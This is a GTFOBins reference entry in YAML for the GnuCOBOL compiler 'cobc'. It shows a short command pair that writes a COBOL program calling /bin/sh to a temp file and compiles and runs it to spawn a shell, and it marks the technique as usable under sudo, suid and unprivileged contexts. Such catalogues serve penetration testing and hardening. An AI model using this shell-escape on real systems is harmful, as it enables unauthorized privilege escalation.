<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/cobc -->
---
functions:
  shell:
  - code: |-
      echo 'CALL "SYSTEM" USING "/bin/sh".' >/path/to/temp-file
      cobc -xFj --frelax-syntax-checks /path/to/temp-file
    comment: |-
      The `/path/to/temp-file` sill be overwritten after the execution.
    contexts:
      sudo:
      suid:
        shell: true
      unprivileged:
...
